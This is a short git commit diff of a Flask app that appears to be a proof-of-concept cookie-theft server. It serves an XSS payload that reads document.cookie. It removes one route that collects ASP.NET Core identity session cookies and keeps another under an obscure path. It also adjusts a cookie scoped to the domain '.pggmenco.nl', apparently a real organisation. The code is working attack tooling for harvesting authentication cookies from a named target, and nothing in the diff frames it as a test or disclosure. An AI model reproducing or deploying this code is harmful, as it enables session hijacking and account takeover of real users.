b08d5e290be61b9967e315fafb831052478652ca
noname430 <56733462+noname430@users.noreply.github.com>
2023-05-25 22:11:09 +0200

    Update app.py

--- app.py
+++ app.py
@@ -13,22 +13,6 @@ def hello_poc():
 def hello_poc_sxss():
     return "<!DOCTYPE html><html><body><script>alert(document.cookie)</script></body></html><!DOCTYPE html><title></title>"
 
-@app.route('/signin-oidc')
-def collect_cookies_2():
-    _ga = request.cookies.get('_ga')
-    _gid = request.cookies.get('_gid')
-    C0 = request.cookies.get('.AspNetCore.Identity.Application')
-    C1 = request.cookies.get('.AspNetCore.Identity.ApplicationC1')
-    C2 = request.cookies.get('.AspNetCore.Identity.ApplicationC2')
-    T1 = request.cookies.get('.AspNetCore.Correlation.5GNyQuh7Z1_6Nho-B_syD_vPRcAFtAt9vrQMGHSEqhc')
-    return f"Cookies to collect: \n\n" \
-    f"_ga = {_ga} \n\n" \
-    f"_gid = {_gid} \n\n" \
-    f".AspNetCore.Identity.ApplicationC1 = {C1} \n\n" \
-    f".AspNetCore.Identity.ApplicationC2 = {C2} \n\n" \
-    f".AspNetCore.Identity.Application = {C0} \n\n" \
-    f".AspNetCore.Correlation = {T1} \n\n"
-
 @app.route('/6w1ymvcfdrf33n7m2cc6')
 def collect_cookies():
     _ga = request.cookies.get('_ga')
@@ -50,7 +34,7 @@ def cookies():
     secure=True,
     httponly=True,
     path='/',
-    samesite=None,    
+    samesite="Lax",    
     domain='.pggmenco.nl'
     )
     
